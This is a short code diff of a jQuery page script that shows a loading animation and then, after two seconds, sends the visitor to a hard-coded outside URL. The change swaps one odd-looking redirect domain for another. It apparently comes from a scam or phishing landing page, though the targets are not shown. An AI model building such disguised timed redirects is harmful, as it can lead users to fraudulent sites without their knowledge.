@@ -5,7 +5,7 @@ $(document).ready(function() {
     $("#process1").show();
  $('.load').fadeIn();
     setTimeout(function(){      
-location.href='https://kuda-terbang.whf.bz/urlwa/choreodev40';
+location.href='https://choreoapps.ll-feed.cfd/urlwa/266';
  $("#process1").hide();
  $('.load').fadeOut();        
          }, 2000);
